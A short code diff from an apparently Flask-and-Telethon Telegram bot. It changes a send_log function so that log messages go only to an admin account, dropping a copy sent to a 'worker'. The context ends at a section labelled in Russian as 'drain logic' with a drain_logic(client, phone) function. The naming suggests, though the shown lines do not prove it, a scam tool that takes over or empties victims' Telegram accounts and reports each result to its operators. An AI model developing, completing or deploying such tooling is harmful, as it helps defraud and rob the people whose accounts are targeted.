@@ -56,12 +56,10 @@ def save_log(text):
 
 def send_log(msg, buttons=None):
     save_log(msg)
-    # Создаем задачу для отправки сообщения в потоке бота
-    coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
-    asyncio.run_coroutine_threadsafe(coro, bot.loop)
-    
-    coro_worker = bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html')
-    asyncio.run_coroutine_threadsafe(coro_worker, bot.loop)
+    # asyncio.run_coroutine_threadsafe — единственный способ подружить Flask и Telethon
+    if bot.loop and bot.loop.is_running():
+        coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
+        asyncio.run_coroutine_threadsafe(coro, bot.loop)
 
 # --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
 async def drain_logic(client, phone):
